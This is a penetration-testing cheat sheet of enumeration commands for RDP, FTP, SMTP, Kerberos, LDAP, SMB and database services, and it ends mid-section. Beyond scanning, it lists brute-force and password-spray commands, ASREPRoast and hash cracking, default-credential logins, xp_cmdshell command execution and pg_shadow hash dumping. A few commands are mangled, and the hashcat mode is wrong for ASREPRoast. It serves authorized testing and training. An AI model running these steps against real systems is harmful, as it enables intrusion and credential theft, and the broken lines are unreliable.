# Footprinting (Scan-Enum) Full

### Phase 1: Protocol & Service Enumeration

### Step 1: RDP Enumeration (Port 3389)

Enumerate Remote Desktop Protocol (RDP) services to identify encryption levels, vulnerabilities, and authentication details.

{% code overflow="wrap" %}
```shell
sudo nmap -p 3389 --script=rdp-enum-encryption,rdp-vuln-ms12-020,rdp-ntlm-info -Pn -n -iL live_hosts.txt -oA rdp_enum
```
{% endcode %}

**Output**: Encryption levels, MS12-020 vulnerability status, and NTLM details for RDP services.

### Step 2: WinRM Enumeration (Ports 5985, 5986)

Enumerate Windows Remote Management (WinRM) services to identify Windows services and user accounts.

{% code overflow="wrap" %}
```shell
sudo nmap -p 5985,5986 --script=http-windows-enum,winrm-enum-users -Pn -n -iL live_hosts.txt -oA winrm_enum
```
{% endcode %}

**Output**: List of Windows services and WinRM user accounts.

### Step 3: FTP Enumeration (Port 21)

Enumerate FTP services to identify versions, anonymous access, vulnerabilities, and configuration details.

**3.1: Nmap Enumeration**

{% code overflow="wrap" %}
```shell
sudo nmap -sV -p 21 -sC -A --script=ftp-anon,ftp-bounce,ftp-syst,ftp-vsftpd-backdoor,ftp-proftpd-backdoor,ftp-libopie -Pn -n -iL live_hosts.txt -oA ftp_enum
```
{% endcode %}

#### **3.2: Manual FTP Interaction**

Manually connect to FTP to verify findings or interact with the service.

```shell
nc -nv <target-ip> 21
```

**Alternative (Telnet)**:

```shell
telnet <target-ip> 21
```

**Alternative (STARTTLS)**:

```shell
openssl s_client -connect <target-ip>:21 -starttls ftp
```

* Test if FTP supports STARTTLS for encrypted connections.

**FTP Commands**:

{% code overflow="wrap" %}
```bash
- Check current local directory: lcd
- Change local directory: lcd Documents
- Upload a file: put main.txt
- Upload to a specific directory: put main.txt ./path/mainupload.txt
- Upload multiple files: mput config.txt testdoc.txt
- Download a file: get testdoc.txt
- Download to a specific directory: get testdoc.txt /home/user/Documents/downloadtestdoc.txt
- Download multiple files: mget config.txt path.txt
- Download all files (anonymous access): wget -m --no-passive ftp://anonymous:anonymous@<target-ip>
```
{% endcode %}

**Output**: Service version, configuration details, anonymous access status, and vulnerability information.

### Step 4: SSH Enumeration (Port 22)

Enumerate SSH services to identify host keys, authentication methods, and supported algorithms.

{% code overflow="wrap" %}
```shell
sudo nmap -sV -p 22 --script=ssh-hostkey,ssh-auth-methods,sshv1,ssh2-enum-algos -Pn -n -iL open_ports.gnmap -oA ssh_enum
```
{% endcode %}

**Output**: SSH version, host keys, authentication methods, and algorithm details.

### Step 5: Telnet Enumeration (Port 23)

Enumerate Telnet services to check for encryption and NTLM information.

{% code overflow="wrap" %}
```shell
sudo nmap -sV -p 23 --script=telnet-encryption,telnet-ntlm-info -Pn -n -iL open_ports.gnmap -oA telnet_enum
```
{% endcode %}

**Manual Interaction**:

```shell
telnet <target-ip> 23
```

**Output**: Telnet version, encryption status, and NTLM details.

### Step 6: SMTP Enumeration (Ports 25, 465, 587)

It is used for sending e-mail. POP3 or IMAP are used for receiving e-mail. Default ports are 25 (SMTP), 465 (SMTPS), 587 (SMTPS).

**Enumeration**

Enumerate SMTP services to identify commands, users, and open relay configurations.

{% code overflow="wrap" %}
```shell
sudo nmap --script smtp-brute -p 25,465,587 <target-ip>
sudo nmap --script smtp-commands -p 25,465,587 <target-ip> 
sudo nmap --script smtp-enum-users -p 25,465,587 <target-ip> 
sudo nmap --script smtp-ntlm-info --script-args smtp-ntlm-sudo info.domain=example.com -p 25,465,587 <target-ip> 
sudo nmap --script smtp-vuln-cve2011-1764 -p 25,465,587 <target-ip> 
sudo nmap --script smtp-* -p 25,465,587 <target-ip>

sudo nmap -sV -p 25,465,587 --script=smtp-commands,smtp-enum-users,smtp-open-relay,smtp-ntlm-info -Pn -n -iL open_ports.gnmap -oA smtp_enum
```
{% endcode %}

**MX Domains**

```shell
dig mx example.com
```

**Users**

```bash
# VRFY - check if the user exists in the SMTP server 
smtp-user-enum -M VRFY -U usernames.txt -t <target-ip> 

# RCPT - check if the user is allowed to receive mails in the SMTP server
smtp-user-enum -M RCPT -u <username> -t <target-ip> 
smtp-user-enum -M RCPT -U usernames.txt -t <target-ip> 

# EXPN - reveal the actual email address 
smtp-user-enum -M EXPN -u <username> -t <target-ip> 
smtp-user-enum -M EXPN -D <hostname> -U usernames.txt -t <target-ip>
```

**STARTTLS**

```shell
# port 25 
openssl s_client -starttls smtp -connect <target-ip>:25 
# Port 465 
openssl s_client -crlf -connect <target-ip>:465 
# Port 587 
openssl s_client -starttls smtp -crlf -connect <target-ip>:587
```

**Connect**

```shell
nc <target-ip> 25 
# or 
telnet <target-ip> 25
```

**Commands**

Commands are not case sensitive.

**HELO - Identify SMTP Server**

```shell
helo example.com
```

Observe the server’s response for supported commands or banner details.

**EHLO - List all supported enhanced functions**

```shell
ehlo example.com
```

* **8BITMIME** - allow to send 8-bit data
* **AUTH** - authentication for the SMTP connection
* **CHUNKING** - transfer chunks of data
* **DSN (Delivery Status Notifications)** - notify delivery status
* **ENHANCEDSTATUSCODES** - allow to show more details of the status
* **ETRN** - process remote queue
* **EXPN** - expand mailing list
* **HELP** - help about commands
* **PIPELINING** - allow the multiple commands
* **SIZE** - maximum message size that can be received
* **SMTPUTF8** -
* **STARTTLS** - communicate with TLS
* **SEND** - send message to terminal
* **TURN** - swap client and server
* **VRFY** - check if the user exists in the SMTP server

**Auth Login**

The `AUTH LOGIN` command allows us to login. We need to input `username/password` in **Base64**.\
Here is the example:

```bash
AUTH LOGIN
# Base64-encoded "username:" 
# Base64-encoded "test" 
# Base64-encoded "password:" 
# Base64-encoded "password"`
```

**Messages**

```bash
# 1. check if the user exists 
vrfy <username> 
vrfy root 

# 2. set the address of the mail sender 
mail from: <username> 
mail from: root 
mail from: sender@example.com 

# 3. set the address of the mail recipient 
rcpt to: <username> 
rcpt to: root 
rcpt to: recipient@example.com 

# 4. send data of message (the message end with ".") 
subject: Test Mail 
This is a test mail. 
```

**Others**

```bash
# process remote queue 
etrn example.com 

# list the mailing list 
expn example.com
```

**Send Mails from External**

{% code overflow="wrap" %}
```bash
swaks --to remote-user@example.com --from local-user@<local-ip> --server mail.example.com --body "hello" 

# --attach: Attach a file 
swaks --to remote-user@example.com --from local-user@<local-ip> --server mail.example.com --body "hello" --attach @evil.docx
```
{% endcode %}

**Start SMTP Server**

```shell
# -n: No setuid 
# -c: Classname
sudo python3 -m smtpd -n -c DebuggingServer 10.0.0.1:25
```

**Overall Output**: SMTP version, supported commands, user enumeration results, open relay status, and NTLM details.

### Step 7: POP3 Enumeration (Ports 110, 995)

Enumerate POP3 services to identify server capabilities and attempt user enumeration.

{% code overflow="wrap" %}
```shell
sudo nmap <target-ip> -sC -sV -p110,143,993,995
sudo nmap --script "pop3-capabilities or pop3-ntlm-info" -p 110 <target-ip>

sudo nmap -sV -p 110,995 --script=pop3-capabilities,pop3-brute -Pn -n -iL open_ports.gnmap -oA pop3_enum
```
{% endcode %}

**Connect**

**Manual Interaction**:

```shell
nc <target-ip> 110
# OR
telnet <target-ip> 110
```

* Replace **target-ip** with the target’s IP.
* Send commands like CAPA to retrieve capabilities or USER **username** to test access. **Output**: POP3 version, server capabilities, and brute-force results (if applicable).

**Commands**

```bash
# Login
USER <username>
PASS <password>

# Number and total size of all messages
STAT
# List messages and size
LIST
# Retrieve the message of given number
RETR <number>
# Delete the message of given number
DELE <number>
# Reset the mailbox
RSET
# Exit the mail server
QUIT
```

### Step 8: IMAP Enumeration (Ports 143, 993)

Enumerate IMAP services to identify capabilities and attempt user enumeration.

{% code overflow="wrap" %}
```shell
sudo nmap --script imap-capabilities -p 143 <target-ip>

sudo nmap -sV -p 143,993 --script=imap-capabilities,imap-brute -Pn -n -iL open_ports.gnmap -oA imap_enum
```
{% endcode %}

**Output**: IMAP version, server capabilities, and brute-force results (if applicable).

**Banner Grabbing**

```shell
nc -nv <target-ip> 143 
openssl s_client -connect <IP>:993 -quiet
```

**Connect**

```shell
telnet 10.0.0.1 143
```

**Commands**

```cs
# Login 
a1 login "<username>" "<password>" 
# Logout 
a1 logout 
# Close mailbox 
a1 close
```

### Step 9: DNS Enumeration (Port 53)

Enumerate DNS services to test for zone transfers, recursion, and service discovery.

{% code overflow="wrap" %}
```shell
sudo nmap -sV -p 53 --script=dns-zone-transfer,dns-nsid,dns-service-discovery,dns-recursion,dns-cache-snoop,dns-random-srcport -Pn -n -iL open_ports.gnmap -oA dns_enum
```
{% endcode %}

**Manual DNS Interaction**:

```bash
dig axfr @<target-ip> <domain>
```

* Replace **target-ip** with the target’s IP and **domain** with the target domain (e.g., example.com).
* Attempt a zone transfer to retrieve DNS records.

**Output**: DNS version, zone transfer results, recursion status, and service discovery details.

### Step 10: Post-Enumeration Analysis

* **Parse Outputs**: Review .gnmap, .xml, or .nmap files for service details and vulnerabilities.
  * Use grep "open" rdp\_enum.gnmap (or similar) to list open ports and services.
  * Import .xml files into tools like Metasploit or custom scripts for further analysis.
* **Correlate Findings**: Match service versions and configurations to known vulnerabilities (e.g., via CVE or Exploit-DB).
* **Validate Manually**: Use nc, telnet, or dig to confirm Nmap findings (e.g., banners, responses).
* **Prioritize Results**: Focus on critical findings, such as:
  * RDP: MS12-020 vulnerabilities or weak encryption.
  * FTP: Anonymous access or backdoors (e.g., vsftpd).
  * SMTP: Open relays or enumerated users.
  * DNS: Successful zone transfers or open recursion.

### Example Workflow Execution

{% code overflow="wrap" %}
```bash
1. Ensure live_hosts.gnmap and open_ports.gnmap exist from prior scans.
2. Enumerate RDP: sudo nmap -p 3389 --script=rdp-enum-encryption,rdp-vuln-ms12-020,rdp-ntlm-info -Pn -n -iL open_ports.gnmap -oA rdp_enum.
3. Enumerate WinRM: sudo nmap -p 5985,5986 --script=http-windows-enum,winrm-enum-users -Pn -n -iL open_ports.gnmap -oA winrm_enum.
4. Enumerate FTP: sudo nmap -sV -p 21 -sC -A --script=ftp-anon,ftp-bounce,ftp-syst,ftp-vsftpd-backdoor,ftp-proftpd-backdoor,ftp-libopie -Pn -n -iL open_ports.gnmap -oA ftp_enum.
    - Manually verify: nc -nv <target-ip> 21 or telnet <target-ip> 21.
5. Enumerate SSH: sudo nmap -sV -p 22 --script=ssh-hostkey,ssh-auth-methods,sshv1,ssh2-enum-algos -Pn -n -iL open_ports.gnmap -oA ssh_enum.
6. Enumerate Telnet: sudo nmap -sV -p 23 --script=telnet-encryption,telnet-ntlm-info -Pn -n -iL open_ports.gnmap -oA telnet_enum.
7. Enumerate SMTP: sudo nmap -sV -p 25,465,587 --script=smtp-commands,smtp-enum-users,smtp-open-relay,smtp-ntlm-info -Pn -n -iL open_ports.gnmap -oA smtp_enum.
    - Manually verify: telnet <target-ip> 25 and send EHLO example.com.    
8. Enumerate POP3: sudo nmap -sV -p 110,995 --script=pop3-capabilities,pop3-brute -Pn -n -iL open_ports.gnmap -oA pop3_enum.
9. Enumerate IMAP: sudo nmap -sV -p 143,993 --script=imap-capabilities,imap-brute -Pn -n -iL open_ports.gnmap -oA imap_enum.
10. Enumerate DNS: sudo nmap -sV -p 53 --script=dns-zone-transfer,dns-nsid,dns-service-discovery,dns-recursion,dns-cache-snoop,dns-random-srcport -Pn -n -iL open_ports.gnmap -oA dns_enum.
    - Manually verify: dig axfr @<target-ip> <domain>.
11. Analyze results and correlate with vulnerability databases.
```
{% endcode %}

***

### Phase 2

### 1. Kerberos Enumeration (Port 88)

#### **Phase 1: Footprinting and Service Discovery**

**Objective**: Identify Kerberos services, realms, and basic configurations on the target.

* **Tools**: Nmap, kerbrute, Impacket
* **Steps**: **Scan for Kerberos Services**:
* Use Nmap to detect open Kerberos port (88) and gather service information.

```shell
sudo nmap -sV -sC -p88 <target>
```

**Gather Kerberos Server Information**:

* Run Nmap script to collect details about the Kerberos server.

```bash
sudo nmap -p 88 --script=krb5-info <target>
```

#### **Phase 2: Enumerating Users and Realms**

**Objective**: Identify valid Kerberos users and verify domain/realm information.

* **Tools**: Nmap, kerbrute, Impacket
* **Steps**: **Enumerate Valid Kerberos Users**:
* Use Nmap to enumerate users in a specified Kerberos realm.

{% code overflow="wrap" %}
```shell
sudo nmap -p 88 --script=krb5-enum-users --script-args="krb5-enum-users.realm='DOMAIN.LOCAL'" <target>
```
{% endcode %}

**User Enumeration with Kerbrute**:

* Use kerbrute to enumerate valid users against a domain controller using a user list.

```shell
kerbrute userenum --dc <IP> -d <DOMAIN> users.txt
```

**Check for ASREPRoastable Users**:

* Use Impacket’s GetNPUsers to identify accounts that don’t require pre-authentication (vulnerable to ASREPRoast).

```shell
impacket-GetNPUsers domain.local/ -usersfile users.txt -no-pass
```

#### **Phase 3: Exploitation and Next Steps**

**Objective**: Leverage findings (e.g., valid users, ASREPRoast vulnerabilities) for further attacks.

* **Steps**: **Exploit ASREPRoast**:
* If ASREPRoastable users are found, extract their TGT hashes and attempt offline cracking with tools like Hashcat.

```shell
hashcat -m 13100 <hash_file> <wordlist> 
```

**Brute-Force or Password Spray**:

* Use enumerated usernames with kerbrute or other tools to perform password spraying (e.g., common passwords like Password123). **Pivot to Other Services**:
* Use discovered credentials to authenticate to other services (e.g., SMB, LDAP) on the domain. **Document Findings**:
* Record enumerated users, realms, and vulnerabilities for the pentest report.

**Notes:**

* **Realm Specification**: Ensure the correct domain (e.g., DOMAIN.LOCAL) is used in scripts like krb5-enum-users or kerbrute.
* **User Lists**: Prepare a users.txt file with potential usernames (e.g., from OSINT or common names) for enumeration.
* **Scope**: Avoid aggressive brute-forcing to prevent account lockouts unless explicitly permitted.

***

### 2. NetBIOS Enumeration (Ports 137, 139)

#### **Phase 1: Footprinting and Service Discovery**

**Objective**: Identify NetBIOS services, names, and associated SMB details.

* **Tools**: Nmap, nmblookup, nbtscan, smbclient
* **Steps**: **Scan for NetBIOS Services**:
* Use Nmap to detect open NetBIOS ports (137, 139) and gather service, OS, and share information.

{% code overflow="wrap" %}
```shell
sudo nmap -p 137,139 --script=nbstat,smb-os-discovery,smb-enum-shares,smb-enum-users <target>
```
{% endcode %}

**Query NetBIOS Names**:

* Use nmblookup to retrieve NetBIOS name table information.

```shell
nmblookup -A <IP>
```

**Scan NetBIOS Information**:

* Use nbtscan to enumerate NetBIOS names, workgroups, and MAC addresses.

```shell
 nbtscan <IP> 
```

#### **Phase 2: Enumerating Shares and Access**

**Objective**: Identify accessible shares and attempt null session connections.

* **Tools**: smbclient
* **Steps**: **List Available Shares (Null Session)**:
  * Use smbclient with legacy protocol support to list shares without credentials.

{% code overflow="wrap" %}
```shell
smbclient --option='client min protocol=LANMAN1' -L \\<IP>\ -N
```
{% endcode %}

#### **Phase 3: Exploitation and Next Steps**

**Objective**: Leverage findings (e.g., accessible shares, enumerated users) for further access.

* **Steps**: **Access Shares**:
* If shares are accessible, connect using smbclient to inspect contents (as described in the SMB flow).

```shell
smbclient \\<IP>\<SHARENAME> -N 
```

**Exploit Misconfigurations**:

* If null sessions reveal sensitive shares or user data, attempt to extract or manipulate files. **Pivot to SMB**:
* Use NetBIOS findings (e.g., domain names, users) to inform SMB enumeration on port 445. **Document Findings**:
* Record NetBIOS names, workgroups, shares, and users for the pentest report.

**Notes:**

* **Legacy Protocols**: The --option='client min protocol=LANMAN1' flag ensures compatibility with older systems; adjust if modern protocols are required.
* **Null Sessions**: Test for null session access cautiously, as it may indicate a misconfiguration.
* **Cross-Service**: NetBIOS often complements SMB enumeration; combine findings for a comprehensive attack.

***

### 3. RPC Enumeration (Port 135)

#### **Phase 1: Footprinting and Service Discovery**

**Objective**: Identify RPC services and available endpoints on the target.

* **Tools**: Nmap, rpcinfo, rpcclient
* **Steps**: **Scan for RPC Services**:
* Use Nmap to detect open RPC port (135) and enumerate available services.

```shell
sudo nmap -sS -Pn -sV --script=rpcinfo.nse -p135 <IP> 
```

**Query RPC Services**:

* Use rpcinfo to list available RPC services and their program numbers.

```shell
rpcinfo <IP> 
```

#### **Phase 2: Enumerating RPC Details**

**Objective**: Gather detailed information about users, groups, or shares via RPC.

* **Tools**: rpcclient
* **Steps**: **Connect to RPC (Null Session)**:
* Attempt to connect without credentials to enumerate information.

```shell
rpcclient -U "" -N <IP>
```

**Enumerate RPC Details**:

* Within rpcclient, run commands like:

{% code overflow="wrap" %}
```bash
srvinfo, enumdomains, querydominfo, netshareenumall, enumdomusers, or queryuser <RID> (as shown in the SMB flow) to gather server, domain, share, and user information.
```
{% endcode %}

#### **Phase 3: Exploitation and Next Steps**

**Objective**: Leverage enumerated data for further attacks or privilege escalation.

* **Steps**: **Exploit RPC Vulnerabilities**:
* If specific RPC services (e.g., MS-RPC endpoints) are identified, check for vulnerabilities like MS17-010 (EternalBlue) using Metasploit. **User Enumeration**:
* Use enumerated users for password spraying or brute-forcing on other services (e.g., SMB, Kerberos). **Document Findings**:
* Record RPC services, endpoints, and enumerated data for the pentest report.

**Notes:**

* **Null Sessions**: RPC often allows null session enumeration; test cautiously to avoid detection.
* **Complex Enumeration**: Combine RPC findings with SMB or Kerberos for a fuller picture of the domain.
* **Scope**: Ensure permission to interact with RPC services, as some actions may disrupt the target.

***

### 4. RPCBind Enumeration (Port 111)

#### **Phase 1: Footprinting and Service Discovery**

**Objective**: Identify RPCBind services and enumerate available RPC programs.

* **Tools**: Nmap
* **Steps**: **Scan for RPCBind Services**:
* Use Nmap to detect open RPCBind port (111) over TCP and UDP, and enumerate services.

```shell
sudo nmap -sU -sT -p 111 --script=rpcinfo <target> 
```

#### **Phase 2: Enumerating RPC Programs**

**Objective**: Identify specific RPC services exposed via RPCBind (e.g., NFS, mountd).

* **Tools**: rpcinfo
* **Steps**: **List RPC Programs**:
* Use rpcinfo to query RPCBind for registered programs and their ports.

```shell
rpcinfo <IP> 
```

#### **Phase 3: Exploitation and Next Steps**

**Objective**: Leverage enumerated RPC services for further enumeration or exploitation.

* **Steps**: **Pivot to Identified Services**:
* If RPCBind reveals services like NFS (port 2049), proceed with NFS enumeration (as described in the NFS flow). **Check for Vulnerabilities**:
* Research CVEs for identified RPC services or versions (e.g., outdated NFS or mountd). **Document Findings**:
* Record RPC programs, their ports, and associated services for the pentest report.

**Notes:**

* **TCP and UDP**: RPCBind operates on both TCP and UDP; ensure Nmap scans both with -sU -sT.
* **Service Pivoting**: RPCBind often points to other services (e.g., NFS); follow up on these for deeper enumeration.
* **Caution**: Avoid disrupting RPCBind services, as they may support critical network functions.

***

### 5. LDAP Enumeration (Ports 389, 636, 3268, 3269)

#### **Phase 1: Footprinting and Service Discovery**

**Objective**: Identify LDAP services and gather basic configuration details.

* **Tools**: Nmap
* **Steps**: **Scan for LDAP Services**:
* Use Nmap to detect open LDAP ports (389, 636, 3268, 3269) and gather service/version information.

```shell
 sudo nmap -sS -Pn -sV --script=ldap* -p389,636,3268,3269 <IP> 
```

**Run LDAP-Specific Scripts**:

* Execute all LDAP-related Nmap scripts to enumerate directory information.

```shell
sudo nmap -p 389,636 --script=ldap* <target>
```

#### **Phase 2: Enumerating LDAP Directory**

**Objective**: Extract information about users, groups, and domain structure from LDAP.

* **Tools**: Nmap
* **Steps**: **Enumerate Without Brute-Forcing**:
* Run LDAP scripts, excluding brute-force attempts, to gather directory details.

```shell
sudo nmap --script "(ldap*) and not brute" -p 389 <target>
```

**Query LDAP Directory and Root DSE**:

* Use Nmap scripts to query the LDAP directory and root DSE for domain information (secure port 636).

```shell
sudo nmap -p 636 --script=ldap-search,ldap-rootdse <target> 
```

#### **Phase 3: Exploitation and Next Steps**

**Objective**: Leverage LDAP findings (e.g., user lists, misconfigurations) for further attacks.

* **Steps**: **Enumerate Users and Groups**:
* If LDAP allows anonymous binds, extract user lists, group memberships, or domain policies. **Exploit Misconfigurations**:
* Check for weak LDAP permissions (e.g., anonymous access) or outdated software vulnerabilities.
* Use tools like ldapsearch for manual queries if credentials are obtained.

```shell
ldapsearch -x -H ldap://<IP> -b "dc=domain,dc=local"  
```

**Pivot to Kerberos or SMB**:

* Use enumerated users or credentials for Kerberos (ASREPRoast, Kerberoasting) or SMB attacks. **Document Findings**:
* Record LDAP directory details, users, groups, and misconfigurations for the pentest report.

***

### Phase 3

### 1. Oracle Enumeration (Port 1521)

#### **Phase 1: Footprinting and Service Discovery**

**Objective**: Identify Oracle database services, versions, and Service Identifiers (SIDs).

* **Tools**: Nmap, tnscmd10g, odat
* **Steps**: **Scan for Oracle Services**:
* Use Nmap to detect open Oracle port (1521) and gather service/version information.

```shell
sudo nmap -sV -sC -p1521 <target>
```

**Enumerate Oracle Version and SIDs**:

* Run Nmap scripts to identify Oracle TNS version and brute-force SIDs.

```shell
sudo nmap -sV -p 1521 --script=oracle-tns-version,oracle-sid-brute <target> 
```

**Probe Oracle TNS Listener**:

* Use tnscmd10g to query the TNS listener for version information.

```shell
tnscmd10g version -h <IP>
```

#### **Phase 2: Enumerating SIDs and Configurations**

**Objective**: Gather detailed information about Oracle SIDs and database configurations.

* **Tools**: odat
* **Steps**: **Ping Oracle Service**:
* Use odat to verify the Oracle TNS listener is reachable.

```shell
odat tnscmd -s <IP> --ping 
```

**Enumerate SIDs**:

* Use odat’s sidguesser module to brute-force valid Oracle SIDs.

```shell
odat sidguesser -s <IP> 
```

**Comprehensive Enumeration**:

* Run odat’s all module to perform extensive enumeration of Oracle configurations.

```shell
odat all -s <IP> -p 1521 
```

#### **Phase 3: Exploitation and Next Steps**

**Objective**: Leverage findings (e.g., valid SIDs, weak configurations) for further access.

* **Steps**: **Test Default Credentials**:
* Use odat or sqlplus to test default credentials (e.g., sys:change\_on\_install, scott:tiger) against discovered SIDs.

```shell
sqlplus -s <username>/<password>@<IP>/<SID>
```

**Exploit Vulnerabilities**:

* If an outdated Oracle version is identified, research CVEs (e.g., TNS listener vulnerabilities) and use tools like Metasploit or odat for exploitation.

```shell
odat passwordguesser -s <IP> -d <SID> -U users.txt -P passwords.txt
```

**Extract Data**:

* If access is gained, query sensitive data (e.g., user tables, credentials) using SQL queries. **Document Findings**:
* Record Oracle version, SIDs, and vulnerabilities for the pentest report.

**Notes:**

* **Default Credentials**: Common Oracle credentials include sys:change\_on\_install, scott:tiger, or system:manager. Test cautiously to avoid lockouts.
* **TNS Listener**: Misconfigured TNS listeners may allow unauthenticated access or information leakage.
* **Scope**: Ensure permission to test Oracle databases, as aggressive actions may disrupt services.

***

### 2. MySQL Enumeration (Port 3306)

#### **Phase 1: Footprinting and Service Discovery**

**Objective**: Identify MySQL services, versions, and basic configurations.

* **Tools**: Nmap, mysql client
* **Steps**: **Scan for MySQL Services**:
* Use Nmap to detect open MySQL port (3306) and gather service/version information.

```shell
sudo nmap -sV -sC -p3306 <target> 
```

**Enumerate MySQL Details**:

* Run Nmap scripts to gather information about MySQL users, databases, and credentials.

{% code overflow="wrap" %}
```shell
sudo nmap -p 3306 --script=mysql-info,mysql-users,mysql-databases,mysql-empty-password,mysql-query,mysql-brute,mysql-dump-hashes <target>  sudo sudo nmap -sV --script=mysql* -p3306 <IP>
```
{% endcode %}

#### **Phase 2: Accessing and Enumerating MySQL**

**Objective**: Attempt to connect to the MySQL server and enumerate databases or users.

* **Tools**: mysql client, Hydra
* **Steps**: **Test Default/Empty Credentials**:
* Attempt to connect as the root user with no password or default credentials.

```shell
mysql -h <IP> -u root  
mysql -h <IP> -u root -p 
```

**Brute-Force Credentials**:

* Use Hydra to brute-force MySQL credentials with user and password lists.

```shell
hydra -L users.txt -P passwords.txt mysql://<IP> 
```

#### **Phase 3: Exploitation and Next Steps**

**Objective**: Leverage access or findings (e.g., credentials, misconfigurations) for further attacks.

* **Steps**: **Access Databases**:
* If credentials are obtained, connect to MySQL and enumerate databases, tables, or sensitive data.

```shell
mysql -h <IP> -u <username> -p<password> -e "SHOW DATABASES;" 
```

**Exploit Vulnerabilities**:

* If an outdated MySQL version is identified, research CVEs (e.g., CVE-2012-2122) and use Metasploit or custom exploits. **Extract Hashes**:
* If mysql-dump-hashes reveals password hashes, attempt offline cracking with tools like Hashcat. **Document Findings**: - Record MySQL version, databases, users, and vulnerabilities for the pentest report.

**Notes:**

* **Empty Passwords**: The mysql-empty-password script checks for unauthenticated access; this is a common misconfiguration.
* **Brute-Forcing**: Use Hydra cautiously to avoid account lockouts or detection.
* **Scope**: Ensure permission to test MySQL, as brute-forcing or querying may disrupt services.

***

### 3. MSSQL Enumeration (Ports 1433, 1434, 2433)

#### **Phase 1: Footprinting and Service Discovery**

**Objective**: Identify MSSQL services, versions, and configurations.

* **Tools**: Nmap
* **Steps**: **Scan for MSSQL Services**:
* Use Nmap to detect open MSSQL ports (1433, 1434, 2433) and gather service/version information.

```shell
sudo nmap -sV -sC -p1433,1434,2433 <target> 
```

**Enumerate MSSQL Details**:

* Run Nmap scripts to gather server info, configurations, and credentials.

{% code overflow="wrap" %}
```shell
sudo nmap -p 1433,1434,2433 --script=ms-sql-info,ms-sql-empty-password,ms-sql-dump-hashes,ms-sql-brute,ms-sql-config <target>
```
{% endcode %}

#### **Phase 2: Accessing and Enumerating MSSQL**

**Objective**: Attempt to connect to the MSSQL server and enumerate databases or users.

* **Tools**: mssqlclient.py (Impacket), sqsh
* **Steps**: **Test Default/Empty Credentials**:
* Attempt to connect with default credentials (e.g., sa:sa) or empty passwords using Impacket.

```shell
impacket-mssqlclient <DOMAIN>/<username>:<password>@<IP> 
```

**Enumerate Databases and Users**:

* If access is gained, query databases, users, or configurations.

```sql
SELECT name FROM sys.databases;  
SELECT name, is_sysadmin FROM sys.server_principals; 
```

#### **Phase 3: Exploitation and Next Steps**

**Objective**: Leverage access or findings (e.g., credentials, misconfigurations) for further attacks.

* **Steps**: **Exploit Weak Credentials**:
* If credentials are obtained, use them to execute commands (e.g., via xp\_cmdshell) for system access.

```shell
 EXEC xp_cmdshell 'whoami'; 
```

**Extract Hashes**:

* If ms-sql-dump-hashes reveals password hashes, attempt offline cracking with Hashcat. **Exploit Vulnerabilities**:
* If an outdated MSSQL version is identified, research CVEs and use Metasploit (e.g., exploit/windows/mssql/mssql\_payload). **Document Findings**:
* Record MSSQL version, databases, users, and vulnerabilities for the pentest report.

**Notes:**

* **Default Accounts**: The sa account is a common target; test default or weak passwords cautiously.
* **Command Execution**: MSSQL’s xp\_cmdshell is a powerful feature if enabled; use it for privilege escalation.
* **Scope**: Ensure permission to test MSSQL, as brute-forcing or command execution may disrupt services.

***

### 4. PostgreSQL Enumeration (Ports 5432, 5433)

#### **Phase 1: Footprinting and Service Discovery**

**Objective**: Identify PostgreSQL services, versions, and configurations.

* **Tools**: Nmap
* **Steps**: **Scan for PostgreSQL Services**:
* Use Nmap to detect open PostgreSQL ports (5432, 5433) and gather service/version information.

```shell
sudo nmap -sV -sC -p5432,5433 <target>
```

**Enumerate PostgreSQL Details**:

* Run Nmap scripts to gather information about databases, users, and configurations.

{% code overflow="wrap" %}
```shell
sudo nmap -p 5432 --script=pgsql-brute,pgsql-databases,pgsql-users <target> sudo nmap -p 5432 --script=pgsql-enum <target>
```
{% endcode %}

**Gather Info on Secure Port**:

* Query the secure PostgreSQL port (5433) for additional details.

```shell
sudo nmap -p 5433 --script=pgsql-info <target> 
```

#### **Phase 2: Accessing and Enumerating PostgreSQL**

**Objective**: Attempt to connect to the PostgreSQL server and enumerate databases or users.

* **Tools**: psql
* **Steps**: **Test Default/Empty Credentials**:
* Attempt to connect as the postgres user with no password or default credentials.

```bash
psql -h <IP> -U postgres
```

**Enumerate Databases and Users**:

* If access is gained, query databases and users.

```bash
\l # List databases  
\du # List users and roles 
```

#### **Phase 3: Exploitation and Next Steps**

**Objective**: Leverage access or findings (e.g., credentials, misconfigurations) for further attacks.

* **Steps**: **Exploit Weak Credentials**:
* If credentials are obtained, extract sensitive data or attempt privilege escalation within the database.

```bash
SELECT * FROM pg_shadow; # Extract user hashes
```

**Exploit Vulnerabilities**:

* If an outdated PostgreSQL version is identified, research CVEs and use Metasploit or custom exploits. **Brute-Force Credentials**:
* If pgsql-brute identifies weak credentials, use them to access restricted databases. **Document Findings**:
* Record PostgreSQL version, databases, users, and vulnerabilities for the pentest report.

***

### 5. SMB Enumeration

#### **Phase 1: Footprinting and Service Discovery**

**Objective**: Identify SMB services, versions, and basic configuration on the target.

* **Steps**: **Scan for SMB Services** Use Nmap to detect open SMB ports (139, 445) and gather service/version information.

```shell
sudo nmap -sV -sC -p139,445 <target>
```

**Enumerate Shares, Users, OS, and Security Settings**: Run Nmap scripts to gather details about shares, users, OS, and SMB security configurations.

{% code overflow="wrap" %}
```shell
sudo nmap -p 139,445 --script=smb-enum-shares,smb-enum-users,smb-os-discovery,smb-security-mode,smb2-capabilities,smb2-security-mode <target> 
```
{% endcode %}

**Check for SMB Vulnerabilities**:

* Scan for known SMB vulnerabilities (e.g., EternalBlue) to identify potential exploits.

```shell
 sudo nmap --script smb-vuln* -p 445 <target>
```

#### **Phase 2: Enumerating Shares and Permissions**

**Objective**: Identify available shares, their permissions, and potential access points (e.g., null sessions).

* **Tools**: smbclient, smbmap, CrackMapExec, enum4linux-ng
* **Steps**: **List Available Shares (Null Session)**:
* Use smbclient to list shares without credentials.

```shell
smbclient -L \\<IP>\ -N  
smbclient -m=SMB2 -L \\<Hostname>\ -N
```

* Use CrackMapExec to enumerate shares with null credentials.

```shell
crackmapexec smb <IP> -u '' -p '' --shares  
crackmapexec smb <IP> --shares -u '' -p ''  
```

* Use smbmap to list shares without credentials.

```bash
smbmap -H <IP>  
smbmap -u DoesNotExists -H <IP>  
```

**Recursively List Files in Shares**:

* Use smbmap to explore share contents recursively.

```bash
smbmap -R -H <IP>  
smbmap -R Replication -H <IP> 
```

**Comprehensive Enumeration with Enum4linux-ng**:

* Perform detailed enumeration of shares, users, and configurations.

```shell
sudo ./enum4linux-ng.py <target> -A -C  
sudo ./enum4linux-ng.py -As <target> -oY out 
```

#### **Phase 3: Connecting to Shares**

